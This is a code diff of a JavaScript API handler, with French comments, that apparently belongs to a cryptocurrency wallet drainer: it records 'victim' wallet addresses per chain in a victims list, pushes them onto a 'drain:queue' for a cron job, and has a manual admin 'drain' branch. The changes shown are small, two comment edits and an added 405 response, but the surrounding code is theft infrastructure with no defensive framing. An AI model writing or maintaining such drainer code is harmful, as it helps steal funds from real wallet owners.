@@ -26,7 +26,7 @@ export default async function handler(req, res) {
   if (req.method === 'POST') {
     const { victim, chain, adminSecret } = req.body;
 
-    // --- DRAIN MANUEL ADMIN ---
+    // --- DRAIN MANUEL ADMIN (inchangé) ---
     if (adminSecret) {
       if (!process.env.ADMIN_SECRET || process.env.ADMIN_SECRET.trim().length === 0) {
         return res.status(500).json({ error: 'ADMIN_SECRET non configuré sur le serveur' });
@@ -78,7 +78,7 @@ export default async function handler(req, res) {
         await client.set('victims:list', JSON.stringify(parsedList));
       }
 
-      // Pousse dans la queue pour le cron (c’est tout, pas de drain immédiat)
+      // Pousse dans la queue pour le cron (pas de drain immédiat)
       await client.lPush('drain:queue', JSON.stringify({ victim, chain: targetChain }));
 
       return res.status(200).json({ success: true, queued: true, victim, chain: targetChain });
@@ -88,4 +88,7 @@ export default async function handler(req, res) {
     } finally {
       await client.disconnect();
     }
+  } else {
+    return res.status(405).json({ error: 'Méthode non autorisée' });
+  }
 }
